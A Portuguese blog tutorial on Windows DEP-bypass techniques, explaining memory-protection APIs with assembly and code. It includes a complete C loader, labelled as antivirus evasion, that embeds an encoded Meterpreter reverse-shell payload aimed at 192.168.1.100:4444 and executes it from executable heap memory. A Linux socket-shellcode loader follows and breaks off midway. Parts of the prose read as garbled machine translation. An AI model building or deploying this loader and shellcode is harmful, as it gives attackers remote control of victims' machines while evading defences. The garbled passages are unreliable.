ref int processInformation = valor para essa flag (1 = habilitado / 0 = disabled), neste caso, 1 significa que é um processo crítico
int processInformationLength = é o valor fornecido para a flag que, no nosso caso, é o tamanho de um inteiro
</pre>
<p>Desativar a DEP para um processo que você precisa para fazer uma chamada para NtSetInformationProcess () com o ProcessInformationClass conjunto para Process- ExecuteFlags (0x22) eo parâmetro ProcessInformation definido para MEM_EXECUTE_OPTION_ENABLE (0x2). O problema com a simples criação de seu shellcode 
para fazer este apelo é que leva alguns parâmetros nulos, bem como, o que é problemático para a maioria shellcode (ver "Bad-Personagem Filtering" na página 75) Portanto, o truque envolve alterar  nosso shellcode no meio de uma função que  vai chamar NtSetInformationProcess () com os parâmetros necessários já na Stack. a aplicação desse conceito em assembly fica a seguinte:</p>
<pre class="code">
7c935d6d 6a04 push 0x4 &#61663; Length := 4
7c935d6f 8d45fc lea eax,[ebp-0x4] 
7c935d72 50 push eax &#61663; &amp;[ebp-4] (0x2)
7c935d73 6a22 push 0x22 &#61663; ProcessExecuteFlags
7c935d75 6aff push 0xff &#61663; NtCurrentProcess()
7c935d77 e8b188fdff call ntdll!ZwSetInformationProcess &#61663; Invoke
7c935d7c e9c076feff jmp 7c91d441 &#61663; NX agora está desabilitado 
</pre>
<p>Em fim, em termo de security, a microsoft fez bem em retirar a função NtSetInformationProcess (), já que a adição dela e algumas técnica de bypass como ROP e ret2libc faz com que deixe o windows completamente "exploitável", quer dizer ele já é né rsrss, pode ficar pior. Vamos entender cada função dessa acima logo e depois veremos como implementar uma shell reverse usando o meterpreter do metasploit, mas calma ae Fera vamos lá novamente.</p>
<h3>VirtualAlloc </h3>
<p> VirtualAlloc administra páginas no sistema de memória virtual do Windows, esta função irá alocar memória nova. Um dos parâmetros para esta função especifica o nível de execução / acesso da memória recém-alocado, por isso o objetivo é definir esse valor para EXECUTE_READWRITE. msdn --&gt; http://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85).aspx</p>
<pre class="code">
LPVOID WINAPI VirtualAlloc(
  _In_opt_  LPVOID lpAddress,
  _In_      SIZE_T dwSize,
  _In_      DWORD flAllocationType,
  _In_      DWORD flProtect
);
</pre>
<p>
IpAddress --&gt; Endereço inicial da região para alocar (= novo local onde você deseja alocar memória). Tenha em mente que este endereço pode ficar arredondado para o múltiplo mais próximo da granularidade de alocação. Você pode tentar colocar a fornecer um valor codificado para este parâmetro.<br />
<br />
dwSize --&gt; Tamanho da região em bytes. (você provavelmente irá precisar para gerar este valor usando rop, a menos que sua exploração pode lidar com bytes nulos).<br />
<br />
flallocationType --&gt; Defina para 0x1000 (MEM_COMMIT). Talvez precise rop para gerar e escrever este valor para a pilha.<br />
<br />
flProtect --&gt; Defina para 0x40 (EXECUTE_READWRITE). Talvez precise rop para gerar e escrever este valor para a pilha.<br />
</p>
<p>Também tem a malloc() para Unix, que faz a mesma coisa, mas VirtualAlloc é a melhor escolha se você deseja controlar totalmente como sua alocação é feita, principalmente se você alocar grandes quantidades de memória. Para atribuições gerais, é melhor usar malloc - a razão é que VirtualAlloc é feito no kernel, malloc é parte do C-runtime (ele irá chamar VirtualAlloc ou algo assim para obter grandes pedaços de memória que ele, então, dividir-se em pequenos . peças) Como você pode ver se você ler os docs e entender sobre o techology mapeamento de memória, o VirtualAlloc não pode alocar pequenos pedaços de memória -. menor "pedaço" seria, no mínimo, 4KB Na verdade, malloc () usa "HeapAlloc" em vez de VirtualAlloc. Mas VirtualAlloc ainda melhor é para grandes blocos de memória, ou quando você tem necessidades especiais que não são cumpridas por malloc () - por exemplo, a memória precisa ser protegido de uma maneira especial, você quer se exceções quando há uma gravação para a memória ou algo assim. esta função só irá alocar memória nova. Você terá que usar uma segunda chamada API para copiar o shellcode em que a nova região e executá-lo. Então, basicamente, você precisa de uma segunda cadeia rop para alcançar este objetivo. Então, basicamente, o endereço de retorno para VirtualAlloc () precisa apontar para a cadeia rop que irá copiar o shellcode para a região recém-alocado e em seguida, saltar para ele).</p>
<h3>HeapCreate + Bônus</h3>
<p>Para usar HeapAlloc você precisa primeiro fazer HeapCreate, para criar um bloco de memória para alocar. . HeapAlloc é então usada para "dividir" o pedaço em pequenas porções Como foi dito, VirtualAlloc é para a reserva e / ou cometer um grande pedaço de memória - útil quando você precisa megabytes. Cometer aqui significa que o mapa de memória é preenchido com páginas de memória real [4KB porções], ao invés de apenas "esta memória existe no espaço do processo, mas não há realmente nenhuma memória real lá", que é "reserva". Se a memória não é cometido quando ele está sendo acessado, serão comprometidos no manipulador de falta de página. Isso é útil se você quiser reservar um realmente grande pedaço de memória, mas você não precisa necessariamente preencher todas as partes de que a memória com dados [por exemplo, uma tabela hash enorme, ou uma tabela indexada por alguns números "aleatórios".</p>
<pre class="code">
ANDLE WINAPI HeapCreate(
  __in  DWORD flOptions,
  __in  SIZE_T dwInitialSize,
  __in  SIZE_T dwMaximumSize
);
</pre>
<p>Esta função vai criar uma pilha privada que pode ser utilizada na nossa exploração. Espaço será reservado no espaço de endereço virtual do processo. Quando o parâmetro flOptions está definido para 0x00040000 (HEAP_CREATE_ENABLE_EXECUTE), todos os blocos de memória que são alocados a partir desta pilha, vai permitir a execução de código, mesmo se a DEP está ativado. Parâmetro dwInitialSize deve conter um valor que indica o tamanho inicial da pilha, em bytes. Se você definir esse parâmetro como 0, então uma página será alocado. O parâmetro dwMaximumSize se refere ao tamanho máximo da pilha, em bytes. Esta função, só vai criar um monte privado e marcá-la como executável. Você ainda alocar memória nesta pilha (com HeapAlloc por exemplo) e, em seguida, copiar o shellcode para esse local pilha (com memcpy (), por exemplo) Quando a função retorna CreateHeap, um ponteiro para a pilha de recém-criado será armazenado em eax. Você vai precisar desse valor para emitir uma chamada HeapAlloc ():</p>
<h3>SetProcessDEPPolicy </h3>
<pre class="code">
BOOL WINAPI SetProcessDEPPolicy(
  __in  DWORD dwFlags
);
</pre>
<p>Como podemos ver é preciso passar apenas um parâmetro para a função SetProcessDEPPolicy(), e este parâmetro deve ser definido como 0 para desativar a DEP para o processo atual. Para que esta função funcione, a atual Política DEP deve ser definido como OptIn ou OptOut. Se a diretiva é definida para AlwaysOn (ou AlwaysOff), então SetProcessDEPPolicy irá lançar um erro. Se um módulo é vinculado com / NXCOMPAT, a técnica não vai funcionar. Por último, e igualmente importante, ele só pode ser chamado para o processo apenas uma vez. Então, se essa função já foi chamado no processo atual (IE8 por exemplo, já o chama quando o processo é iniciado), não vai funcionar. msdn --&gt; http://msdn.microsoft.com/en-us/library/bb736299%28v=VS.85%29.aspx </p>
<h3>VirtualProtect () essa sim é importante</h3>
<p>Como já expliquei em artigos anteriores, não podemos deixar de lado funções que são extremamente importante para tudo em si, é a VirtualProtect() presente até no windows 10 (isso se você estiver lendo esse artigo em 2014), essa função ela muda a proteção de acesso da memoria  do processo. E se você quiser usar essa função é preciso passar todos os 5 parâmetro exigidos. </p>
<pre class="code">
BOOL WINAPI VirtualProtect (
  __in LPVOID lpAddress,
  __in size_t dwSize,
  __in DWORD flNewProtect,
  __out PDWORD lpflOldProtect
);
</pre>
<p>using</p>

<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">==</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Error setting memory executable: error code %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span></code></pre></div>

<p>Para ver as permissões podemos usar o seguinte código: </p>

<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="cp">#include &lt;Windows.h&gt;</span>
<span class="cp">#include &lt;assert.h&gt;</span>
<span class="cp">#include &lt;iostream&gt;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">HMODULE</span> <span class="n">hmod</span> <span class="o">=</span> <span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">L&quot;kernel32.dll&quot;</span><span class="p">);</span>
    <span class="n">MEMORY_BASIC_INFORMATION</span> <span class="n">info</span><span class="p">;</span>
    <span class="c1">// Start at PE32 header</span>
    <span class="n">SIZE_T</span> <span class="n">len</span> <span class="o">=</span> <span class="n">VirtualQuery</span><span class="p">(</span><span class="n">hmod</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">info</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">info</span><span class="p">));</span>
    <span class="n">assert</span><span class="p">(</span><span class="n">len</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">BYTE</span><span class="o">*</span> <span class="n">dllBase</span> <span class="o">=</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">info</span><span class="p">.</span><span class="n">AllocationBase</span><span class="p">;</span>
    <span class="n">BYTE</span><span class="o">*</span> <span class="n">address</span> <span class="o">=</span> <span class="n">dllBase</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(;;)</span> <span class="p">{</span>
        <span class="n">len</span> <span class="o">=</span> <span class="n">VirtualQuery</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">info</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">info</span><span class="p">));</span>
        <span class="n">assert</span><span class="p">(</span><span class="n">len</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">info</span><span class="p">.</span><span class="n">AllocationBase</span> <span class="o">!=</span> <span class="n">dllBase</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&quot;Address: &quot;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">info</span><span class="p">.</span><span class="n">BaseAddress</span><span class="p">;</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&quot; (&quot;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">info</span><span class="p">.</span><span class="n">RegionSize</span> <span class="o">&lt;&lt;</span> <span class="s">&quot;) &quot;</span><span class="p">;</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&quot; protect = &quot;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">info</span><span class="p">.</span><span class="n">Protect</span><span class="p">;</span>
        <span class="n">DWORD</span> <span class="n">oldprotect</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">info</span><span class="p">.</span><span class="n">Protect</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&quot;, VirtualProtect skipped&quot;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
        <span class="k">else</span> <span class="p">{</span>
            <span class="n">BOOL</span> <span class="n">ok</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">info</span><span class="p">.</span><span class="n">BaseAddress</span><span class="p">,</span> 
            <span class="n">info</span><span class="p">.</span><span class="n">RegionSize</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
            <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&quot;, VirtualProtect = &quot;</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">ok</span> <span class="o">?</span> <span class="s">&quot;okay&quot;</span> <span class="o">:</span> <span class="s">&quot;Failed!&quot;</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">address</span> <span class="o">=</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">info</span><span class="p">.</span><span class="n">BaseAddress</span> <span class="o">+</span> <span class="n">info</span><span class="p">.</span><span class="n">RegionSize</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></div>

<p>A saída vai ser algum parecido com isso:</p>
<pre>
Address: 77470000 (1000)  protect = 2, VirtualProtect = okay
Address: 77471000 (f000)  protect = 0, VirtualProtect skipped
Address: 77480000 (62000)  protect = 20, VirtualProtect = okay
Address: 774E2000 (e000)  protect = 0, VirtualProtect skipped
Address: 774F0000 (7e000)  protect = 2, VirtualProtect = okay
Address: 7756E000 (2000)  protect = 0, VirtualProtect skipped
Address: 77570000 (1000)  protect = 4, VirtualProtect = okay
Address: 77571000 (f000)  protect = 0, VirtualProtect skipped
Address: 77580000 (1000)  protect = 2, VirtualProtect = okay
Address: 77581000 (f000)  protect = 0, VirtualProtect skipped
Address: 77590000 (1a000)  protect = 2, VirtualProtect = okay
Address: 775AA000 (6000)  protect = 0, VirtualProtect skipped
Já em C# podemos invocar da lib kernel32.dll e passar esses argumento para um processo dessa forma:
</pre>

<p>Já em C# podemos invocar da lib kernel32.dll e passar esses argumento para um processo dessa forma:</p>

<div class="highlight"><pre><code class="language-c#" data-lang="c#"><span class="n">importando</span> <span class="n">lib</span> 
<span class="p">--------------------------</span>
<span class="na">[DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]</span>
<span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="nf">VirtualProtect</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwSize</span><span class="p">,</span>
   <span class="kt">uint</span> <span class="n">flNewProtect</span><span class="p">,</span> <span class="k">out</span> <span class="kt">uint</span> <span class="n">lpflOldProtect</span><span class="p">);</span>

<span class="n">Passando</span> <span class="n">permissões</span>
<span class="p">--------------------------</span>
<span class="k">public</span> <span class="k">enum</span> <span class="n">Protection</span>
<span class="p">{</span>
  <span class="n">PAGE_NOACCESS</span> <span class="p">=</span> <span class="m">0</span><span class="n">x01</span><span class="p">,</span>
  <span class="n">PAGE_READONLY</span> <span class="p">=</span> <span class="m">0</span><span class="n">x02</span><span class="p">,</span>
  <span class="n">PAGE_READWRITE</span> <span class="p">=</span> <span class="m">0</span><span class="n">x04</span><span class="p">,</span>
  <span class="n">PAGE_WRITECOPY</span> <span class="p">=</span> <span class="m">0</span><span class="n">x08</span><span class="p">,</span>
  <span class="n">PAGE_EXECUTE</span> <span class="p">=</span> <span class="m">0</span><span class="n">x10</span><span class="p">,</span>
  <span class="n">PAGE_EXECUTE_READ</span> <span class="p">=</span> <span class="m">0</span><span class="n">x20</span><span class="p">,</span>
  <span class="n">PAGE_EXECUTE_READWRITE</span> <span class="p">=</span> <span class="m">0</span><span class="n">x40</span><span class="p">,</span>
  <span class="n">PAGE_EXECUTE_WRITECOPY</span> <span class="p">=</span> <span class="m">0</span><span class="n">x80</span><span class="p">,</span>
  <span class="n">PAGE_GUARD</span> <span class="p">=</span> <span class="m">0</span><span class="n">x100</span><span class="p">,</span>
  <span class="n">PAGE_NOCACHE</span> <span class="p">=</span> <span class="m">0</span><span class="n">x200</span><span class="p">,</span>
  <span class="n">PAGE_WRITECOMBINE</span> <span class="p">=</span> <span class="m">0</span><span class="n">x400</span>
<span class="p">}</span></code></pre></div>

<p>Certo que nem precisa disso pra executar um shellcode em c# , minha tool é a prova disso &lt;a href="https://github.com/P0cL4bs/hanzoInjection"target="_blank"&gt;HanzoInejtion inspirada em naruto :( que já ta acabando (:( sem sploilers). lembrando que ela returna verdadeiro ou falso, lógico :@. </p>
<h3>WriteProcessMemory ()</h3>
<p>vem de msdn --&gt; http://msdn.microsoft.com/en-us/library/ms681674(VS.85).aspx, lol.</p>
<pre class="code">
BOOL WINAPI WriteProcessMemory (
  __in SEGURAR hProcess,
  __in LPVOID lpBaseAddress,
  __in LPCVOID lpBuffer,
  __in service size_t,
  __out size_t * lpNumberOfBytesWritten
);
</pre>
<p>Esta função permite que você copie seu shellcode para outro (executável) local para que você possa acessá-la e executá-la. Durante a cópia, WPM () irá garantir que o local de destino é marcado como gravável. Você só tem que ter certeza do destino alvo é executável.Esta função requer seis parâmetros na pilha, WriteProcessMemory () oferece funcionalidade DEP-bypass para múltiplos  cenários de exploração. Na situação em que um palpite decente pode ser feito para  a localização de shellcode, esta função revela-se um único conveniente  solução hop. Mesmo quando o local de shellcode é indeterminado, contanto  como espaço de pilha está disponível para cadeia vários retornos, WriteProcessMemory () é muito útil, também serve para outras coisa que veremos em breve :D.</p>
<p>A ideia de usar essa API é simples pode nos permite copiar o shellcode para uma região de memória com EXECUTAR atributos Depois poderemos saltar para ele O local de destino deve ser gravável e executável, e já que toquei no assunto andei lendo algumas coisas sobre o powershell do windows e da pra fazer uma infinidade de coisas achei um blog de um pesquisador bem conhecido e parece que me returnou uma luz , até o projeto do colbatstrike feito pelo Raphael a evolução que ele criou do meterpreter ainda em desenvolvimento, voltando ao assunto http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html esse é o blog tem algumas coisa que pode ajudar a compreensão de como usar as API nativa do windows. Essa API também é muito usada para fazer injetion process, caso ele tenha reservado maior quantidade na memoria podemos até executar outro file ou até mesmo ganhar o controle da aplicação basicamente muito idêntico ao migrate do meterpreter, penso em escreve sobre ele em breve como criar alguns script usando ruby.</p>

<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="cp">#include &lt;windows.h&gt;</span>
<span class="cm">/*</span>
<span class="cm">------------------------------------------------</span>
<span class="cm">Autor: Mharcos Nesster (mh4x0f)  </span>
<span class="cm">Email:mh4root@gmail.com</span>
<span class="cm"> Greetx: Team P0cL4bs {N4sss, Chrislley, MovCode, Joridos , MMXM }</span>
<span class="cm"> github: https://github.com/P0cL4bs/HeapExecShellcode</span>
<span class="cm">bypass AV em C  and Assembly.</span>
<span class="cm">Shellcode execute Heap</span>
<span class="cm">-----------------------------------------------</span>
<span class="cm">*/</span>
<span class="c1">//section code permission to read to wite</span>
<span class="cp">#pragma section(&quot;.code&quot;,execute, read, write)</span>
<span class="cp">#pragma section(&quot;.codedata&quot;, read, write)</span>
<span class="c1">// secton native application</span>
<span class="cp">#pragma comment(linker,&quot;/MERGE:.codedata=.code&quot;)</span>
<span class="c1">// rewrite memory</span>
<span class="cp">#pragma comment(linker,&quot;/SECTION:.code,ERW&quot;)</span>
<span class="c1">// onde fica todas variável globais :D</span>
<span class="c1">//  all variable global   </span>
<span class="cp">#pragma data_seg(&quot;.codedata&quot;)</span>
<span class="cp">#pragma const_seg(&quot;.codedata&quot;)</span>
<span class="cp">#pragma code_seg(&quot;.code&quot;)</span>


<span class="cm">/* meterpreter 192.168.1.100 port 4444  encoded shikata_ga_nai 10 */</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
<span class="s">&quot;</span><span class="se">\xb8\xca\x31\x30\xe8\xda\xdf\xd9\x74\x24\xf4\x5a\x33\xc9\xb1</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\x86\x31\x42\x13\x83\xc2\x04\x03\x42\xc5\xd3\xc5\x33\x1b\xca</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\x52\xe0\x6f\x52\xe0\xd4\x57\xcd\x48\x0e\xae\xbf\x0c\x61\x4d</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\xd9\x71\x44\xa9\xda\x08\x52\x29\x15\x91\x69\xe6\x66\x23\xfd</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\x5e\x9a\xce\xb5\x52\xc6\x16\xc8\xf7\x2b\x86\x17\xcf\xfd\xcd</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\x9a\xbe\xc2\xb8\x2b\x95\xd5\xc4\xba\xc8\x41\xea\x78\x3a\x9e</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\x81\x9d\xb5\xce\xea\xc2\xa9\xb5\x2d\xe2\x09\x32\xe3\x4f\xcf</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\xd2\x59\x70\x42\x47\x2b\x35\xe7\xb5\x03\x70\xe7\x29\x09\x76</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\xac\x7c\x89\x65\x93\x62\x8e\x1c\x91\xfb\xf9\x73\x67\xf2\x68</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\x6e\x06\x11\x30\xb0\x28\x89\xcc\x66\x3e\x44\x05\xfa\x8f\x50</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\x42\x23\xb5\xa8\x29\xa2\x99\x14\xb8\x79\x67\xc7\x45\x25\x6e</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\x1b\x56\xad\xe9\x9e\x2c\x0e\xc8\x48\xbe\xad\x02\x44\xc4\x64</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\x5b\x85\xe9\x87\x23\xef\xd8\x47\x27\x26\xf8\x2e\x50\xde\xf1</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\x29\x6b\x68\x3b\xc1\x41\x65\xdc\x58\x14\x85\x1e\xc5\x20\xbf</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\xe6\xd5\xb9\xbb\x44\x68\x3f\x77\x0f\x7c\xad\xe5\xc0\x73\x06</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\xa0\x71\x1c\xb0\x7a\x25\x31\x9c\xe5\xaf\x01\x09\x0b\x2e\xf3</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\x9a\x18\x50\xe8\x47\x03\x7f\x25\x32\x88\xdb\x3a\x2a\x93\x12</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\xf8\x2a\xf4\x12\xf2\x23\xa6\x98\x67\xfd\xe7\xa2\xc8\x90\xc8</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\x9c\x72\x80\xf7\xfe\x23\x54\x6c\xd8\x64\x4a\x23\x2e\x2a\x19</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\x09\x95\x98\xa5\x14\x01\x33\x56\xee\xd5\x62\xac\x60\x4d\xe2</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\x98\x3b\xaf\x86\x04\x79\x61\x91\xe6\x46\x1f\x0b\xc9\x66\x63</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\x5d\x4f\x57\x3d\x8d\x96\x1a\x64\x34\xab\xe5\xa6\x39\xd7\x92</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\x10\x05\x41\x0b\x0b\xef\x06\xf7\xfa\x28\x67\xc2\x44\x75\xd6</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\xef\x4f\xa0\xa2\x93\x3d\xad\x20\xb6\x19\xc4\xfa\xd7\x0e\x6b</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\x3a\x0e\xcc\x75\xf7\xa2\xf0\x6d\x09\xc0\xf1\x37\x12\x06\x2c</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\xa9\x69\xf6\x3e\xc5\x2d\xea\x69\x42\x22\x60\x5b\x6b\xf2\x6f</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\x61\xe9\x93\x19\xc1\x97\x9f\xe9\x45\x03\x1b\xe8\x3f\xaa\xe5</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\xda\xc3\x8d\x89\xd4\x5d\xf0\x7c\xc4\x4d\x40\x20\xb2\xaa\x29</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\x40\xfd\x67\xcf\x91\x18\xe5\xb4\x75\x21\x21\x89\x71\xa1\x9a</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\x05\xd5\x39\x48\x2d\xcf\xa1\x29\x9e\xd5\x5e\x3c\xfb\xc6\x8b</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\xc1\xaf\x1d\x9e\x4d\x46\x05\x94\x61\xbb\x28\xb2\xe9\xff\xe5</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\xfd\x58\xfe\x3c\xc0\xd9\x47\xaf\x79\xf5\x39\x1d\xcc\x64\x89</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\xbc\x5b\x87\xab\x36\x26\xd5\xd3\x18\x01\x2d\xd5\xd1\xe3\xb6</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\x0e\x37\x52\x8c\x70\x12\x9e\x67\xd9\x22\xe7\xa4\xc3\x01\x4b</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\x7c\x43\xf9\xc1\x28\xf4\x65\xef\xb1\x53\x89\x81\x33\x09\xdc</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\xae\x27\xf5\xa6\x36\x1b\xf9\x2d\xb7\xaf\x6d\x62\x0c\x10\xf1</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\xfc\x3e\x07\x84\xc9\x08\x18\x91\xbd\x50\x07\xbb\x76\xb8\x0f</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\x2d\xcc\x18\x3c\xa4</span><span class="s">&quot;</span><span class="p">;</span>

<span class="c1">// call windows API </span>
<span class="kt">int</span> <span class="n">WINAPI</span> <span class="nf">WinMain</span><span class="p">(</span><span class="n">HINSTANCE</span> <span class="n">hInstance</span><span class="p">,</span> <span class="n">HINSTANCE</span> <span class="n">hPrevInstance</span><span class="p">,</span>
 <span class="n">LPSTR</span> <span class="n">szCmdLine</span><span class="p">,</span> <span class="kt">int</span> <span class="n">iCmdShow</span><span class="p">)</span> <span class="p">{</span>
<span class="k">typedef</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)();</span>
 <span class="cm">/* alloc in heap the shellcode*/</span>
 <span class="kt">void</span> <span class="o">*</span> <span class="n">heap</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">VirtualAlloc</span><span class="p">(</span>
 <span class="nb">NULL</span><span class="p">,</span>
 <span class="mi">4096</span><span class="p">,</span>
 <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span>
 <span class="n">PAGE_EXECUTE_READWRITE</span> 
 <span class="p">);</span>
<span class="c1">// copy shellcode in memory alloc </span>
<span class="n">CopyMemory</span><span class="p">(</span><span class="n">heap</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">shellcode</span><span class="p">);</span>
<span class="n">fp</span> <span class="n">func</span> <span class="o">=</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span><span class="n">heap</span><span class="p">;</span>
 <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)();</span> <span class="c1">// execute shellcode</span>
<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">#pragma section(&quot;.stub&quot;, execute, read, write)</span>
<span class="cp">#pragma code_seg(&quot;.stub&quot;)</span>
<span class="cp">#pragma section(&quot;.stubdata&quot;, read, write)</span>
<span class="cp">#pragma comment(linker,&quot;/MERGE:.stubdata=.stub&quot;)</span>
<span class="cp">#pragma data_seg(&quot;.stubdata&quot;)</span>
<span class="cp">#pragma const_seg(&quot;.stubdata&quot;)</span>
<span class="cp">#pragma code_seg(&quot;.stub&quot;)</span></code></pre></div>

<h3> Shellcode Unix Exec</h3>

<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="cp">#include &lt;stdio.h&gt;</span>
<span class="cp">#include &lt;sys/mman.h&gt;</span>
<span class="cp">#include &lt;string.h&gt;</span>
<span class="cp">#include &lt;stdlib.h&gt;</span>
<span class="c1">// bypass DEP Unix </span>
 <span class="c1">// by: Mharcos Nesster</span>
<span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">sc</span><span class="p">)();</span>
 
<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> \
<span class="s">&quot;</span><span class="se">\x31\xdb\xf7\xe3\xb0\x66\x53\xfe\xc3\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x6a\x66\x58\x5b\x5e\x66\x68</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\x0d\xf0</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x6a\x66\x58\x01\xdb\x6a\x01\x57\x89\xe1\xcd\x80\x6a</span><span class="s">&quot;</span>
